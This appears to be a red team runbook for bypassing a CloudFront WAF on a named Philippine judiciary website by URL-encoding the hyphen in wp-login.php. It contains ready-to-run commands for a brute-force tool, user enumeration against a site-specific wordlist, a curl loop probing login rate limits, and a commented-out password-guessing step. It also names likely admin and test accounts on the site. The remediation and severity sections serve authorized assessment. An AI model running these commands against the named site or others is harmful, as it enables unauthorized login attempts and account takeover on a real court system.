# Red team engagement runbook — CloudFront WAF bypass (sc.judiciary.gov.ph)

**Scope:** Authorized assessment only. Keep RoE letter, scope boundaries, and contact channels on record.

## Finding: WAF literal-match bypass

| Step | URL | Expected |
|------|-----|----------|
| 1 | `GET /wp-login.php` | **403** (WAF) |
| 2 | `GET /wp%2Dlogin.php` | **200** + login form |
| 3 | `GET /wp%2Dlogin.php?action=lostpassword` | Password reset flow |

Root cause: WAF matches literal `wp-login.php` without URL normalization; Apache decodes `%2D` → `-`.

## Commands (run from engagement jump host)

```bash
cd tools/wordpress-bruter
./setup.sh
export TARGET_URL=https://sc.judiciary.gov.ph

# 1) Read-only bypass confirmation (safe to automate)
python3 verify_waf_bypass.py -u "$TARGET_URL"

# 2) User enumeration — one invalid password per user (document in report)
python3 wp_bruter.py -u "$TARGET_URL" --bypass hyphen \
  --enumerate-only --users wordlists/sc-judiciary-users.txt --delay 1

# 3) Rate-limit check — 10 rapid probes (no dictionary)
for i in $(seq 1 10); do
  curl -s -o /dev/null -w "%{http_code}\n" -X POST "$TARGET_URL/wp%2Dlogin.php" \
    -d "log=tyke-test-admin&pwd=probe$i&wp-submit=Log+In&testcookie=1"
done

# 4) Password testing — ONLY if RoE explicitly allows; use your wordlist
# python3 wp_bruter.py -u "$TARGET_URL" --bypass hyphen \
#   --users wordlists/sc-judiciary-users.txt --passwords /path/to/roe-wordlist.txt
```

## Report sections to include

1. **Executive summary** — Primary auth control (CloudFront WAF) bypassed by encoding; no secondary controls (rate limit, 2FA, lockout).
2. **Evidence** — Screenshots/curl of 403 vs 200, enumeration messages, lost-password behavior.
3. **Affected users** — scweb (likely admin), PIO editors, tyke-test-admin (high value).
4. **Remediation** — Normalize URLs before WAF; origin-only wp-login; rate limiting; remove test accounts; restrict `/wp-json/wp/v2/users`.

## Severity rationale

**Critical** — Intended primary control for hiding WordPress authentication is ineffective; chained with no rate limiting and test admin account.
